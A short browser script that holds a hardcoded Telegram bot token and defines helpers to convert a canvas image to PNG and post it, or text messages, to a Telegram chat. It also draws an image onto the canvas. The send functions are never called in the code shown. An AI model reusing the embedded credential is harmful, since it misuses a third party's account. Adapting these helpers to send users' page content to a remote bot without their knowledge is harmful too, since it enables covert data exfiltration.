<script>
    let teleId, teleSendUrl, teleSendPhotoUrl;
    const teleToken = "bot1480350910:AAFwyDTBFcwQi7Y_iHXqPkbC4XIAPZ4x81c";

    const teleGet = () => {
        fetch(`https://api.telegram.org/${teleToken}/getUpdates`).then(res => {
            res.json().then(data => {
                teleId = data.result[0].message.chat.id;
            });
        });
    }
    teleGet();

    const makeFile = (canvasEle) => {
        const blobBin = atob(canvasEle.toDataURL().split(",")[1]);
        const array = [];
        for (let i = 0; i < blobBin.length; i++) {
            array.push(blobBin.charCodeAt(i));
        }
        const file = new Blob([new Uint8Array(array)], { type: "image/png" });
        return file;
    }

    const teleSendPhoto = (canvasEle, caption) => {
        const url = `https://api.telegram.org/${teleToken}/sendphoto?chat_id=${teleId}`
        const file = makeFile(canvasEle);
        const teleData = new FormData();
        teleData.append("photo", file);
        teleData.append("caption", caption);
        fetch(url, {
            method: "POST",
            body: teleData
        });
    }

    const teleSend = (msg) => {
        const url = `https://api.telegram.org/${teleToken}/sendMessage?chat_id=935941732&text=${msg}`;
        fetch(url);
    }


    const img = document.querySelector("#img");
    const canvas = document.querySelector("#canvas");
    const ctx = canvas.getContext("2d");

    const draw = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0, img.width, img.height);
    }
    draw();
</script>
